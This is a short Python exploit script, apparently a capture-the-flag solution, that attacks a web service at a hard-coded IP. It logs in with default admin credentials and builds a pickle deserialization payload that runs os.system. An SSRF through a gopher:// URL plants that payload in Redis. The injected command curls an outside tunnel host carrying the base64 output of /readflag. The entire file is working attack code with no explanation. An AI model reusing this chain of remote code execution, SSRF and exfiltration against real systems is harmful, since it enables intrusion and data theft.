import requests, pickle, base64


def generate_payload(cmd):
        class RCE(object):
            def __reduce__(self):
                import os

                return (os.system, (cmd,))

        payload = pickle.dumps(RCE())
        return payload

if __name__ == "__main__":
    cmd = 'curl http://oqdgft-ip-103-242-105-157.tunnelmole.com?flag=$(/readflag | base64)'

    base = "http://165.22.116.7:32379"
    headers = {"Content-Type":"application/json"}
    r = requests.post(base + "/api/login", json={"username":"admin","password":"admin"})
    print(f"{r.cookies}")

    picklePayload = base64.b64encode(generate_payload(cmd))

    print(f"{picklePayload=}")

    ssrf = "gopher://127.0.0.1:6379/_" + requests.utils.quote(f"HSET jobs 404 {picklePayload.decode()}\nSAVE")

    r = requests.post(base + "/api/tracks/add", cookies=r.cookies, json={"trapName":"Ghost","trapURL":ssrf})
    print(r.text)
